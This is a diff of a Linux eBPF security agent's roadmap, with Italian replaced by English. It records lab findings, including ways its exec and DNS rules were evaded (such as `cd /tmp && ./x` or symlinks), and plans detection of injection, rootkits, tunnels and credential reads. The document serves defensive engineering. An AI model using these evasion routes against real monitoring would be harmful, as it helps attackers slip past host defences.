+  BPF maps/links/programs, drop-ins and `set-property`, bpffs and bind mounts,
+  cgroup freezer, modules, `oom_score_adj`, `.local` overlay; findings
+  40–44 found and closed; second part done on 11 October, lab PR 32:
+  `cgroup.kill`, saturation with an exec hidden in a flood, io_uring as a
+  blind channel — 23 cases, finding 46 closed (every run signs `agent_stop`, the
+  next boot states whether the previous one ended cleanly);
+  kexec/livepatch/unsigned module with `lockdown` active done on 11
+  October, lab PR 43, on Ubuntu 22.04 with `lockdown=integrity`: the agent
+  runs unchanged, kexec (C17) and a module with its signature stripped loaded with
+  `finit_module` (C27, livepatches included) are refused by the kernel and the
+  attempt stays recorded by R018 — 28 cases; `host-check` counts
+  lockdown as enforced module signing; every case must end in an
+  event in the chain log, not only in a refusal)
+- `.local` overlay only through a signed `nn-admin` (done on 11 October, lab
+  PR 33): the agent loads an overlay only if `<overlay>.sig` proves that
+  a key with the `config-manage` role signed its exact
+  content, for this agent and not before the last accepted signature (no
+  rollback); otherwise it uses that list's defaults and records
   `unauthorized_overlay`; `nn-admin config overlay set|sign|status`,
-  adozione degli overlay esistenti in `install.sh --upgrade`
-- Verifica formale con Kani dopo il fuzzing (prima parte fatta l'11
-  ottobre, lab PR 35: cursore del ClientHello TLS e scansione del QNAME DNS
-  dimostrati per ogni input di dimensione limitata, job CI settimanale; la
-  prima prova ha trovato un controllo dei limiti che andava in overflow;
-  seconda parte fatta l'11 ottobre, lab PR 44: la regola del quorum delle
-  firme amministrative, separata dalla crittografia e dimostrata — accetta
-  solo con abbastanza chiavi distinte che portano ogni ruolo richiesto, e
-  una soglia 0 non conia più un token senza firma nelle build di release.
-  Valutati i blocchi `unsafe`: nell'agent sono chiamate di sistema via
-  libc, i record dei ring buffer passano dall'API controllata di bytemuck
-  e l'FFI di Candle è codice di terzi, quindi non c'è un nucleo nostro da
-  dimostrare; restano gli altri parser binari)
-- Overhead misurato su host carico (strumento fatto l'11 ottobre, lab PR
-  37: `nn-lab.sh overhead` alterna agent spento e acceso su quattro
-  micro-carichi — open, scrittura, exec, connect su loopback — e riporta la
-  mediana del throughput perso e la CPU dell'agent. Primo giro su 6.8, con
-  l'host non a riposo: open −37 %, scrittura −47 %, exec −11 %, connect
-  −31 %. Il costo sui file nasce dal sensore `sys_enter_openat`, che manda
-  in userland ogni open dell'host anche quando l'agent poi lo scarta: va
-  filtrato nel kernel insieme allo spostamento su LSM di 10.9 (rilievo 45).
-  Il log INFO di ogni exec vale circa il 5 % della CPU dell'agent sugli
-  exec. Lo stesso giro ha trovato due falsi positivi che uccidevano
-  processi legittimi, rilievi 38 e 47, chiusi nel lab PR 36. Numeri
-  ufficiali a tre giri su host a riposo, Ubuntu 24.04, 12 ottobre (lab PR
-  69): open +25,4 %, scrittura +29,1 %, exec +8,6 %, connect +34,1 %, udp
-  +25,2 %, dns +14,2 %; restano gli altri guest. Dato grezzo dal soak:
-  ~34 % di una vCPU a 20 exec/s + 10 file/s + 5 tcp/s. Cifre ritirate con
-  il lab PR 228: i dati grezzi non erano stati conservati; ora le cifre
-  vengono solo dai file di risultato di `nn-lab.sh perf`, committati in
-  `docs/validation/results/` (il primo: Ubuntu 24.04, kernel 6.8, 21
-  ottobre, con il controllo A/A e le soglie del gate,
-  `docs/validation/PERF_BASELINE.md`); restano gli altri guest)
-- Pacchetti `.deb`/`.rpm`. Prerequisiti fatti l'11 ottobre:
-  - binari fuori da `/usr/local/bin` (lab PR 39, rilievi 26 e 51): l'agent
-    protegge e riconosce sia il layout di `install.sh` sia `/usr/bin` +
-    `/usr/lib/systemd/system`, che `install.sh` accetta con
-    `BIN_DIR`/`UNIT_DIR`; chiusa anche una copia della unit nelle
-    directory runtime di systemd che la sostituiva senza lasciare traccia;
-  - il gestore di pacchetti sopravvive all'agent (lab PR 38, rilievo 49):
-    le regole FIM uccidevano `dpkg` su unit, timer, cron, moduli PAM e
-    binari setuid e lasciavano pacchetti a metà; ora le scritture di
-    dpkg/rpm/dnf e dei loro script restano registrate come Low senza kill,
-    e `nn-lab.sh pkgmgr-check` lo verifica.
-  Pacchetti fatti l'11 ottobre, lab PR 40: `.deb` e `.rpm` costruiti con
-  dpkg-deb e rpmbuild, pubblicati e attestati con il tarball; gli script del
-  pacchetto riusano `install.sh`/`uninstall.sh` (migrazione da
-  un'installazione con `install.sh`, aggiornamento e rimozione solo con la
-  finestra trusted-installer, nessun avvio alla prima installazione);
-  `nn-lab.sh pkg-check` verifica l'intero ciclo di vita, superato su Ubuntu
-  24.04, Debian 12 e Ubuntu 22.04, e il 12 ottobre su AlmaLinux 9 con
-  l'RPM, insieme a `pkgmgr-check` con rpm e dnf (lab PR 68)
-- BTF esterna per kernel senza BTF nativa (valutata l'11 ottobre, lab PR
-  41, decisione del founder: i programmi LSM, fentry/fexit e `tp_btf` si
-  agganciano tramite la BTF interna del kernel, che nessun file esterno
-  può fornire, quindi la BTF esterna servirebbe solo a una modalità di
-  sola telemetria senza anti-tamper, oggi rifiutata dalla politica
-  fail-closed; la valutazione ha trovato e chiuso il rilievo 53: senza
-  BTF l'aggancio anti-tamper degradava con un WARN invece di rifiutare
-  l'avvio. Dettagli in `docs/operator/KERNEL_COMPATIBILITY.md`)
+  adoption of existing overlays in `install.sh --upgrade`
+- Formal verification with Kani after fuzzing (first part done on 11
+  October, lab PR 35: the TLS ClientHello cursor and the DNS QNAME scan
+  proven for every input of bounded size, a weekly CI job; the
+  first proof found a bounds check that overflowed;
+  second part done on 11 October, lab PR 44: the quorum rule of the
+  administrative signatures, separated from the cryptography and proven — it accepts
+  only with enough distinct keys carrying every required role, and
+  a threshold of 0 no longer mints an unsigned token in release builds.
+  The `unsafe` blocks were assessed: in the agent they are system calls through
+  libc, the ring buffer records go through bytemuck's checked API,
+  and Candle's FFI is third-party code, so there is no core of our own to
+  prove; the other binary parsers are still open)
+- Overhead measured on a loaded host (tool done on 11 October, lab PR
+  37: `nn-lab.sh overhead` alternates the agent off and on over four
+  micro-workloads — open, write, exec, connect on loopback — and reports the
+  median of the lost throughput and the agent's CPU. First round on 6.8, with
+  the host not idle: open −37 %, write −47 %, exec −11 %, connect
+  −31 %. The cost on files comes from the `sys_enter_openat` sensor, which sends
+  every open of the host to userland even when the agent then drops it: it must be
+  filtered in the kernel together with the move to LSM in 10.9 (finding 45).
+  The INFO log of each exec is about 5 % of the agent's CPU on
+  execs. The same round found two false positives that killed
+  legitimate processes, findings 38 and 47, closed in lab PR 36. Official
+  numbers over three rounds on an idle host, Ubuntu 24.04, 12 October (lab PR
+  69): open +25.4 %, write +29.1 %, exec +8.6 %, connect +34.1 %, udp
+  +25.2 %, dns +14.2 %; the other guests are still open. Raw figure from the soak:
+  ~34 % of one vCPU at 20 exec/s + 10 files/s + 5 tcp/s. Figures withdrawn with
+  lab PR 228: the raw data had not been kept; now the figures
+  come only from the result files of `nn-lab.sh perf`, committed in
+  `docs/validation/results/` (the first: Ubuntu 24.04, kernel 6.8, 21
+  October, with the A/A check and the gate thresholds,
+  `docs/validation/PERF_BASELINE.md`); the other guests are still open)
+- `.deb`/`.rpm` packages. Prerequisites done on 11 October:
+  - binaries outside `/usr/local/bin` (lab PR 39, findings 26 and 51): the agent
+    protects and recognises both the `install.sh` layout and `/usr/bin` +
+    `/usr/lib/systemd/system`, which `install.sh` accepts with
+    `BIN_DIR`/`UNIT_DIR`; also closed: a copy of the unit in the
+    systemd runtime directories that replaced it without leaving a trace;
+  - the package manager survives the agent (lab PR 38, finding 49):
+    the FIM rules killed `dpkg` on units, timers, cron, PAM modules and
+    setuid binaries and left packages half done; now the writes of
+    dpkg/rpm/dnf and of their scripts stay recorded as Low with no kill,
+    and `nn-lab.sh pkgmgr-check` checks it.
+  Packages done on 11 October, lab PR 40: `.deb` and `.rpm` built with
+  dpkg-deb and rpmbuild, published and attested with the tarball; the
+  package scripts reuse `install.sh`/`uninstall.sh` (migration from
+  an install made with `install.sh`, upgrade and removal only with the
+  trusted-installer window, no start at the first install);
+  `nn-lab.sh pkg-check` checks the whole life cycle, passed on Ubuntu
+  24.04, Debian 12 and Ubuntu 22.04, and on 12 October on AlmaLinux 9 with
+  the RPM, together with `pkgmgr-check` with rpm and dnf (lab PR 68)
+- External BTF for kernels without native BTF (assessed on 11 October, lab PR
+  41, founder's decision: the LSM, fentry/fexit and `tp_btf` programs
+  attach through the kernel's internal BTF, which no external file
+  can provide, so external BTF would only serve a
+  telemetry-only mode without anti-tamper, refused today by the
+  fail-closed policy; the assessment found and closed finding 53: without
+  BTF the anti-tamper attach degraded with a WARN instead of refusing
+  to start. Details in `docs/operator/KERNEL_COMPATIBILITY.md`)
 
-Demo: stesso tarball installato e verificato su quattro distribuzioni,
-nightly verde su tutte, release verificabile con un comando, soak da
-24 h senza crescita di memoria.
-Stato all'11 ottobre (lab PR 45): lo stesso tarball prodotto e attestato
-dalla CI supera `nn-lab.sh release-check` su Ubuntu 24.04, Ubuntu 22.04 e
-Debian 12 (checksum, binari eseguibili sulla glibc del guest, verifica di
-`install.sh` con provenienza `checksums`, integrità al boot, hook, sonda,
-una detection). Il 12 ottobre anche su AlmaLinux 9, con gli artefatti CI
-di `main` 1777e6f: la demo vale sulle quattro distribuzioni.
+Demo: the same tarball installed and verified on four distributions,
+nightly green on all of them, a release verifiable with one command, a 24 h
+soak with no memory growth.
+State on 11 October (lab PR 45): the same tarball built and attested
+by the CI passes `nn-lab.sh release-check` on Ubuntu 24.04, Ubuntu 22.04 and
+Debian 12 (checksums, binaries that run on the guest's glibc, `install.sh`
+verification with `checksums` provenance, integrity at boot, hooks, probe,
+one detection). On 12 October also on AlmaLinux 9, with the CI artefacts
+of `main` 1777e6f: the demo holds on the four distributions.
 
 ---
 
-## Tappa 10.9 — Copertura delle evasioni (in corso)
+## Tappa 10.9 — Evasion coverage (in progress)
 
-Obiettivo: le regole smettono di dipendere dal solo percorso del binario
-e il sensore vede i canali che oggi gli sfuggono. Decisa il 10 ottobre
-2026 dopo una revisione esterna dell'inventario (confronto con Falcon,
-Elastic Defend, Tetragon, Tracee, Falco e letteratura 2024–2026); non
-cambia l'ordine delle Tappe successive.
+Goal: the rules stop depending on the binary's path alone,
+and the sensor sees the channels that escape it today. Decided on 10 October
+2026 after an external review of the inventory (a comparison with Falcon,
+Elastic Defend, Tetragon, Tracee, Falco and the 2024–2026 literature); it does
+not change the order of the later Tappe.
 
-- Punto di aggancio dei sensori (progetto dell'11 ottobre,
-  `docs/design/TAPPA10_9_SENSOR_ATTACH_POINTS_DESIGN.md`, unito su
-  richiesta del founder: le opzioni proposte per le sei decisioni valgono
-  salvo diversa indicazione; la Q5 è riformulata dopo il passo 0, perché
-  `fexit` su `ip_make_skb` si aggancia solo da 6.5 e resta il
-  `kretprobe`. Passo 0 fatto l'11 ottobre: sonde usa e getta su LSM
-  `file_open` e `bprm_check_security`, `kretprobe` su `ip_make_skb` /
-  `ip6_make_skb` e `kprobe` su `udp_send_skb`, caricate ed esercitate da
-  `nn-lab.sh sensor-feasibility`, 18/18 proprietà su 6.8, 6.1 e 5.15
-  (AlmaLinux 9 dopo il soak). Costo per apertura misurato su 6.8: un
-  programma LSM vuoto aggiunge 147 ns (−4,6 %), quindi la soglia del 5 %
-  non è raggiungibile in lab (nuova decisione Q7 per il founder); il
-  filtro completo costa 1,6 µs e va messo in cache per directory. Passo 1
-  (aperture file) fatto il 12 ottobre (lab PR 52) nell'osservatore FIM su
-  `file_open`: regole per inode, per (padre, nome) e per nome delle
-  credenziali, classe delle directory in cache (la risalita degli
-  antenati è una funzione BPF globale, verificata a parte: inline superava
-  il milione di istruzioni del verificatore 5.15), scritture contate nel
-  kernel (`Event::MassWrite`), `sys_enter_openat` staccato una volta
-  armato il sensore (interruttore `--file-open-sensor tracepoint` per un
-  ciclo di soak); rilievo 54 corretto (credenziali in ogni home segnalate
-  senza kill, nuova decisione Q8 per il founder); `nn-lab.sh
-  open-sensor-check` 8/8 e `tamper-check` OK su 6.8, 5.15 e 6.1. Misura su
-  6.8: perdita sulle aperture dal 31,9 % al 28,2 %, CPU dell'agente per
-  apertura da 6,4 µs a quasi zero; il dimezzamento proposto in Q7 non è
-  raggiunto, perché il resto viene dagli hook FIM di chiusura e di
-  scrittura (nuovo rilievo 59, decisione per il founder). Passo 2 (exec)
-  fatto il 12 ottobre (lab PR 53): sensore su LSM `bprm_check_security`,
-  le regole di exec leggono il file eseguito dal kernel (rilievo 61:
-  `cd /tmp && ./x`, un symlink o `..` eludevano R001–R010);
-  `nn-lab.sh exec-sensor-check` 8/8 su 6.8, 6.1 e 5.15. Passo 3 (DNS) il
-  12 ottobre (lab PR 57): kprobe su `udp_send_skb` / `udp_v6_send_skb`, il
-  QNAME si legge dalla copia del kernel, anche verso resolver IPv6
-  (rilievi 66 e 67: un resolver IPv6, una pagina non ancora caricata o un
-  byte zero in una label eludevano NET-004); la Q5 è rivista perché il
-  `kretprobe` su `ip_make_skb` non vede la porta di destinazione;
-  `nn-lab.sh dns-sensor-check`. Trovati nel frattempo i rilievi 65 (il fix
-  della build di release per x86-64-v2 non arrivava alla build, corretto)
-  e 68 (flussi UDP verso IPv6 senza riga netflow). Trovato
-  e corretto il rilievo 55: su btrfs
-  le chiavi `(dev, ino)` dello userland non corrispondevano a quelle del
-  kernel, e FIM e protezione dei file non vedevano nulla (ora il kernel
-  usa il device del sottovolume, come `stat()`; `nn-lab.sh btrfs-check`).
-  Nessuna regola legge gli
-  eventi `openat`, che servono solo alla postura, e l'unico uso che
-  richiede tutte le aperture è il conteggio delle scritture di massa,
-  quindi il sensore può filtrare e contare nel kernel; trovato il
-  rilievo 54: con la lista FIM di base le credenziali nelle home degli
-  utenti non sono sorvegliate) (ricerca dell'11 ottobre: TOCTOU «Phantom»
-  di Guo/Zeng e canale io_uring): `sys_enter_openat` → LSM `file_open`
-  (path dal `struct file`, `bpf_path_d_path` dove esiste); QNAME DNS letto
-  dopo la copia nel kernel, non dall'iov utente all'ingresso di
-  `udp_sendmsg`; `sys_enter_execve` → LSM `bprm_check_security` con deny
-  opzionale per R001–R004 e per gli hash in quarantena (il limite di
-  toolchain citato in `exec_check.rs` non vale più: l'agent attacca già
-  più di venti programmi LSM con la stessa toolchain)
-- Contesto del carico di lavoro: cgroup id, namespace (pid/mnt/net) e,
-  dove presenti, container id, immagine, pod e unit systemd negli eventi
-  di processo, file e rete; allowlist e regole per identità (cgroup,
-  unit, utente) oltre che per percorso
-- Injection a runtime: `process_vm_writev`/`readv`, scritture su
-  `/proc/<pid>/mem`, `LD_PRELOAD` e `LD_LIBRARY_PATH` dall'ambiente del
-  processo (oggi solo il file `ld.so.preload`), caricamento di shared
-  object da path volatili, uprobe sugli interpreti (python, perl, node,
-  bash) per attribuire gli script eseguiti da stdin o `-c`
-- Living off the land: exec indiretto (`fexecve`, script da stdin,
-  `systemd-run`, copia di binari legittimi in path consentiti) coperto
-  per identità e per comportamento, non per nome
-- DNS cifrato e tunnel: DoH/DoT verso resolver non configurati, volumi
-  anomali su DNS e ICMP, beacon con jitter verso CDN legittime
-- Caso d'uso dei canary estesi agli account (chiavi SSH e token esca)
-- Persistence correlata, non solo osservata: catena scrittura di unit,
-  timer o cron → `systemctl enable/start` o `crontab` → esecuzione del
-  binario da PID 1 o da cron, con severità che sale a ogni anello
-  (oggi FIM-007/009/023 vedono la scrittura, non l'esecuzione)
-- Masquerading generico (T1036): un binario con il nome di uno strumento
-  di sistema eseguito fuori dai percorsi gestiti dal package manager, o
-  con hash diverso dal pacchetto installato (`dpkg -V`/`rpm -V` come
-  oracolo); account (T1136): `useradd`/`usermod`/`passwd`, nuovi UID 0,
-  modifiche a `shadow` e `sudoers` come evento di account e non solo
-  come drift di file
-- Hook LSM mancanti rispetto allo stato dell'arte 2024–2026, in ordine:
+- Sensor attach point (design of 11 October,
+  `docs/design/TAPPA10_9_SENSOR_ATTACH_POINTS_DESIGN.md`, merged at the
+  founder's request: the proposed options for the six decisions hold
+  unless stated otherwise; Q5 is reworded after step 0, because
+  `fexit` on `ip_make_skb` attaches only from 6.5 and the
+  `kretprobe` stays. Step 0 done on 11 October: throwaway probes on LSM
+  `file_open` and `bprm_check_security`, `kretprobe` on `ip_make_skb` /
+  `ip6_make_skb` and `kprobe` on `udp_send_skb`, loaded and exercised by
+  `nn-lab.sh sensor-feasibility`, 18/18 properties on 6.8, 6.1 and 5.15
+  (AlmaLinux 9 after the soak). Cost per open measured on 6.8: an
+  empty LSM program adds 147 ns (−4.6 %), so the 5 % threshold
+  cannot be reached in the lab (a new decision Q7 for the founder); the
+  full filter costs 1.6 µs and must be cached per directory. Step 1
+  (file opens) done on 12 October (lab PR 52) in the FIM observer on
+  `file_open`: rules by inode, by (parent, name) and by credential
+  name, directory class in a cache (the walk up the
+  ancestors is a global BPF function, verified on its own: inline it went over
+  the 5.15 verifier's million instructions), writes counted in the
+  kernel (`Event::MassWrite`), `sys_enter_openat` detached once
+  the sensor is armed (a `--file-open-sensor tracepoint` switch for one
+  soak cycle); finding 54 fixed (credentials in every home reported
+  without a kill, a new decision Q8 for the founder); `nn-lab.sh
+  open-sensor-check` 8/8 and `tamper-check` OK on 6.8, 5.15 and 6.1. Measured on
+  6.8: loss on opens from 31.9 % to 28.2 %, the agent's CPU per
+  open from 6.4 µs to almost zero; the halving proposed in Q7 is not
+  reached, because the rest comes from the FIM hooks on close and on
+  write (new finding 59, a decision for the founder). Step 2 (exec)
+  done on 12 October (lab PR 53): sensor on LSM `bprm_check_security`,
+  the exec rules read the file being run from the kernel (finding 61:
+  `cd /tmp && ./x`, a symlink or `..` evaded R001–R010);
+  `nn-lab.sh exec-sensor-check` 8/8 on 6.8, 6.1 and 5.15. Step 3 (DNS) on
+  12 October (lab PR 57): kprobe on `udp_send_skb` / `udp_v6_send_skb`, the
+  QNAME is read from the kernel's copy, also towards IPv6 resolvers
+  (findings 66 and 67: an IPv6 resolver, a page not loaded yet or a
+  zero byte in a label evaded NET-004); Q5 is revised because the
+  `kretprobe` on `ip_make_skb` does not see the destination port;
+  `nn-lab.sh dns-sensor-check`. Found along the way: findings 65 (the fix
+  of the release build for x86-64-v2 did not reach the build, fixed)
+  and 68 (UDP flows to IPv6 with no netflow row). Found
+  and fixed finding 55: on btrfs
+  the userland `(dev, ino)` keys did not match the
+  kernel's, and FIM and file protection saw nothing (now the kernel
+  uses the subvolume's device, like `stat()`; `nn-lab.sh btrfs-check`).
+  No rule reads the
+  `openat` events, which only serve the posture, and the only use that
+  needs every open is the count of mass writes,
+  so the sensor can filter and count in the kernel; found
+  finding 54: with the base FIM list, the credentials in the users'
+  homes are not watched) (research of 11 October: the "Phantom" TOCTOU
+  of Guo/Zeng and the io_uring channel): `sys_enter_openat` → LSM `file_open`
+  (path from the `struct file`, `bpf_path_d_path` where it exists); DNS QNAME read
+  after the copy into the kernel, not from the user iov at the entry of
+  `udp_sendmsg`; `sys_enter_execve` → LSM `bprm_check_security` with an optional
+  deny for R001–R004 and for quarantined hashes (the
+  toolchain limit cited in `exec_check.rs` no longer holds: the agent already attaches
+  more than twenty LSM programs with the same toolchain)
+- Workload context: cgroup id, namespaces (pid/mnt/net) and,
+  where present, container id, image, pod and systemd unit in the
+  process, file and network events; allowlists and rules by identity (cgroup,
+  unit, user) as well as by path
+- Runtime injection: `process_vm_writev`/`readv`, writes to
+  `/proc/<pid>/mem`, `LD_PRELOAD` and `LD_LIBRARY_PATH` from the
+  process environment (today only the `ld.so.preload` file), loading of shared
+  objects from volatile paths, uprobes on interpreters (python, perl, node,
+  bash) to attribute scripts run from stdin or `-c`
+- Living off the land: indirect exec (`fexecve`, scripts from stdin,
+  `systemd-run`, copies of legitimate binaries in allowed paths) covered
+  by identity and by behaviour, not by name
+- Encrypted DNS and tunnels: DoH/DoT to resolvers that are not configured,
+  anomalous volumes on DNS and ICMP, beacons with jitter towards legitimate CDNs
+- Canary use case extended to accounts (SSH keys and decoy tokens)
+- Correlated persistence, not only observed: a chain of a unit,
+  timer or cron write → `systemctl enable/start` or `crontab` → execution of the
+  binary from PID 1 or from cron, with a severity that rises at each link
+  (today FIM-007/009/023 see the write, not the execution)
+- Generic masquerading (T1036): a binary with the name of a system
+  tool run outside the paths managed by the package manager, or
+  with a hash different from the installed package (`dpkg -V`/`rpm -V` as
+  the oracle); accounts (T1136): `useradd`/`usermod`/`passwd`, new UID 0,
+  changes to `shadow` and `sudoers` as an account event and not only
+  as file drift
+- LSM hooks missing compared with the 2024–2026 state of the art, in order:
   `sb_mount`/`move_mount`/`sb_umount` (mount, bind mount, overlay,
-  pivot_root, chroot); `task_fix_setuid` e `capable` (cambi di uid/gid e
-  uso di capability nella lineage, oggi visti solo all'exec);
-  `mmap_file`/`file_mprotect` (memoria eseguibile dopo scrittura, W^X —
-  oggi copriamo solo l'exec da memfd/`/proc/self/fd`, R004);
-  `socket_bind`/`socket_accept` e `inet_sock_set_state` (bind e accept
-  oggi non visti; connect, listen e close sì); tracepoint
-  `sched_process_fork` per la lineage completa; `kernel_load_data` e
-  `kernel_read_file` (kexec, firmware, moduli e livepatch caricati da
-  userland: oggi vediamo solo `module_load`)
-- Exec per proprietà dell'inode, non per path: tmpfs, memfd,
-  `O_TMPFILE`, `nlink == 0`, `execveat(AT_EMPTY_PATH)`, loader dinamico
-  come argv[0] (Elastic FENIX 2026); identità del processo per hash
-  calcolato nel kernel (`bpf_ima_file_hash`, dove IMA è attivo)
-- Ecosistema BPF, seconda fase: hook `bpf_prog` e helper rari rilevati al
-  caricamento (`bpf_probe_write_user`, `bpf_override_return`,
-  `bpf_send_signal` — Datadog 2026, rootkit LinkPro e VoidLink), attach
-  XDP/TC osservati
-- Integrità del kernel: `init_module` da buffer distinto da `finit_module`
-  (con cattura del blob), controllo periodico di syscall table, operazioni
-  ftrace e lista moduli (moduli nascosti), credenziali cambiate senza
-  setuid legittimo (copia ombra alla LKRG), viste incrociate per processi
-  e socket nascosti (PUMAKIT, VoidLink)
-- JA4 nella blocklist accanto a JA3 (oggi nessun sensore cattura
-  l'impronta TLS, né JA3 né JA4: NN-L-NET-003 è inattiva, BUG-025, e
-  `nn-admin net status` lo dice; serve prima la cattura)
-- Enforcement inline (LSM `-EPERM`) per un sottoinsieme deterministico
-  delle regole: exec da tmpfs/memfd, lettura di credenziali da binari
-  fuori allowlist, connect verso blocklist; l'LLM e la scala di posture
-  restano in userland
-- Operazioni di namespace viste dalla syscall (`unshare`, `setns`,
-  `clone` con `CLONE_NEW*`), non dal nome del tool (R013 oggi guarda
-  `nsenter`/`unshare` per comm)
-- Identità del carico di lavoro su Kubernetes (SPIFFE/SVID e token di
-  service account osservati al punto d'uso, correlati a processo, cgroup
-  e connessione): prerequisito delle Tappe 13–14, non del nucleo
+  pivot_root, chroot); `task_fix_setuid` and `capable` (uid/gid changes and
+  capability use in the lineage, today seen only at exec);
+  `mmap_file`/`file_mprotect` (executable memory after a write, W^X —
+  today we cover only exec from memfd/`/proc/self/fd`, R004);
+  `socket_bind`/`socket_accept` and `inet_sock_set_state` (bind and accept
+  are not seen today; connect, listen and close are); the
+  `sched_process_fork` tracepoint for the full lineage; `kernel_load_data` and
+  `kernel_read_file` (kexec, firmware, modules and livepatches loaded from
+  userland: today we see only `module_load`)
+- Exec by inode property, not by path: tmpfs, memfd,
+  `O_TMPFILE`, `nlink == 0`, `execveat(AT_EMPTY_PATH)`, dynamic loader
+  as argv[0] (Elastic FENIX 2026); process identity by a hash
+  computed in the kernel (`bpf_ima_file_hash`, where IMA is active)
+- BPF ecosystem, second phase: `bpf_prog` hook and rare helpers detected at
+  load (`bpf_probe_write_user`, `bpf_override_return`,
+  `bpf_send_signal` — Datadog 2026, the LinkPro and VoidLink rootkits), XDP/TC
+  attaches observed
+- Kernel integrity: `init_module` from a buffer, distinct from `finit_module`
+  (with capture of the blob); a periodic check of the syscall table, ftrace
+  operations and the module list (hidden modules); credentials changed without
+  a legitimate setuid (a shadow copy, as LKRG does); cross views for hidden processes
+  and sockets (PUMAKIT, VoidLink)
+- JA4 in the blocklist next to JA3 (today no sensor captures
+  the TLS fingerprint, neither JA3 nor JA4: NN-L-NET-003 is inactive, BUG-025, and
+  `nn-admin net status` says so; the capture is needed first)
+- Inline enforcement (LSM `-EPERM`) for a deterministic subset
+  of the rules: exec from tmpfs/memfd, reading credentials from binaries
+  outside the allowlist, connect to the blocklist; the LLM and the posture ladder
+  stay in userland
+- Namespace operations seen from the syscall (`unshare`, `setns`,
+  `clone` with `CLONE_NEW*`), not from the tool's name (R013 today looks at
+  `nsenter`/`unshare` by comm)
+- Workload identity on Kubernetes (SPIFFE/SVID and service account
+  tokens observed at the point of use, correlated with process, cgroup
+  and connection): a prerequisite of Tappe 13–14, not of the core
 
-Demo: lo stesso attacco eseguito da un container, da uno script passato
-a `python3 -c` e via `io_uring` produce la stessa catena di detection
-di quello eseguito da una shell in `/tmp`.
+Demo: the same attack run from a container, from a script passed
+to `python3 -c` and through `io_uring` produces the same detection chain
+as the one run from a shell in `/tmp`.
 
 ---
 
-## Tappa (ex 9) — UI locale Rust nativa (non iniziata, slittata dopo la 10.9)
+## Tappa (ex 9) — Native Rust local UI (not started, moved after 10.9)
 
-Obiettivo: interfaccia accattivante, 100% Rust, niente Electron.
+Goal: an attractive interface, 100% Rust, no Electron.
 
-- Valutazione pratica tra: Iced, Slint, Tauri+Yew (Rust→WASM)
-- Decisione presa con prototipo veloce di una sola pagina dashboard
-- Implementazione: lista alert real-time, bottoni azione manuale,
-  status agent, log filtrabili
-- Design: scuro, militare, leggibile. Niente UI da SaaS generico.
-- Ricognizione della superficie dati già fatta:
+- A hands-on comparison of: Iced, Slint, Tauri+Yew (Rust→WASM)
+- Decision made with a quick prototype of a single dashboard page
+- Implementation: real-time alert list, manual action buttons,
+  agent status, filterable logs
+- Design: dark, military, readable. No generic SaaS UI.
+- Survey of the data surface already done:
   `docs/tappa9/UI_DATA_SURFACE_RECON.md`
 
-Demo: apri la GUI, vedi alert in tempo reale, clicchi "Quarantena"
-su un evento manuale, l'azione parte.
+Demo: you open the GUI, see alerts in real time, click "Quarantine"
+on a manual event, and the action starts.
 
 ---
 
-## Tappa (ex 10) — Scout proattivo: assessment + hardening (non iniziata, slittata dopo la 10.9)
+## Tappa (ex 10) — Proactive Scout: assessment + hardening (not started, moved after 10.9)
 
-Obiettivo: all'installazione, NorthNarrow chiude le falle.
+Goal: at install, NorthNarrow closes the gaps.
 
-- Scanner di postura Linux:
-  - Permessi SUID/SGID anomali
+- Linux posture scanner:
+  - Anomalous SUID/SGID permissions
   - sshd_config (RootLogin, PasswordAuthentication)
   - SELinux/AppArmor status
-  - Servizi esposti su rete
-  - CVE noti del kernel installato
-  - Catena di fiducia del boot e del kernel (revisione del 10 ottobre
-    2026): Secure Boot e UKI con measured boot, `lockdown=integrity`,
-    firma dei moduli, kexec e livepatch limitati, IMA/EVM in appraisal
-    sui binari e sulle unit, `/usr` immutabile (dm-verity, sysext
-    firmate), bpffs dedicato — ciò che rende l'anti-tamper dell'agent
-    non aggirabile da root
-- Base dei controlli: ANSSI-BP-028 v2.0 (contenuto SCAP/ComplianceAsCode,
-  Licence Ouverte 2.0) invece di una lista proprietaria, con il livello
-  raggiunto (Minimal → High) nel report; profilo «appliance» opzionale con
-  IPE + dm-verity (6.12+), in cui il binario dell'agent non è sostituibile
-  nemmeno da root offline
-- LLM ragiona su priorità + propone fix
-- Modalità auto-fix (con conferma admin la prima volta)
-  vs solo-report
+  - Services exposed on the network
+  - Known CVEs of the installed kernel
+  - Chain of trust of the boot and the kernel (review of 10 October
+    2026): Secure Boot and UKI with measured boot, `lockdown=integrity`,
+    module signing, kexec and livepatch restricted, IMA/EVM in appraisal
+    on the binaries and the units, immutable `/usr` (dm-verity, signed
+    sysexts), a dedicated bpffs — what makes the agent's anti-tamper
+    impossible for root to get around
+- Baseline of the controls: ANSSI-BP-028 v2.0 (SCAP/ComplianceAsCode content,
+  Licence Ouverte 2.0) instead of a proprietary list, with the level
+  reached (Minimal → High) in the report; an optional "appliance" profile with
+  IPE + dm-verity (6.12+), where the agent's binary cannot be replaced,
+  not even by root offline
+- The LLM reasons about priorities + proposes fixes
+- Auto-fix mode (with admin confirmation the first time)
+  vs report-only
 
-Demo: installi NorthNarrow su VM con config debole. Scan in 30s,
-report di 12 falle, 8 fixate in automatico, 4 segnalate per review.
+Demo: you install NorthNarrow on a VM with a weak config. Scan in 30s,
+a report of 12 gaps, 8 fixed automatically, 4 flagged for review.
 
 ---
 
-## Tappa 11 — Windows agent: sensori user-mode (ETW)
+## Tappa 11 — Windows agent: user-mode sensors (ETW)
 
-Obiettivo: parità Linux→Windows senza affrontare ancora kernel driver.
+Goal: Linux→Windows parity without taking on a kernel driver yet.
 
-- Sensori basati su Event Tracing for Windows via crate ferrisetw
-- Cattura: process creation, network connections, file operations,
+- Sensors based on Event Tracing for Windows through the ferrisetw crate
+- Capture: process creation, network connections, file operations,
   registry writes
-- Riuso di tutto il decision engine, executor, LLM dalle Tappe 1-6
-- Esecutori Windows: OpenProcess + TerminateProcess,
-  Windows Filtering Platform user-mode API per blocco rete
+- Reuse of the whole decision engine, executor and LLM from Tappe 1-6
+- Windows executors: OpenProcess + TerminateProcess,
+  the Windows Filtering Platform user-mode API to block the network
 
-Demo: stesso ransomware test della Tappa 5, eseguito su Windows.
-Stessa risposta: kill + isolamento.
-
----
-
-## Tappa 12 — Windows kernel driver (quando maturo)
-
-Obiettivo: anti-tamper kernel-grade su Windows.
-
-- Valutazione windows-drivers-rs maturità (oggi è preview)
-- Se ancora preview → manteniamo ETW user-mode + hardening WDAC come
-  alternativa
-- Se production-ready → minifilter + ObCallbacks in Rust no_std
-- Firma driver Microsoft (€€€) e WHQL submission
-
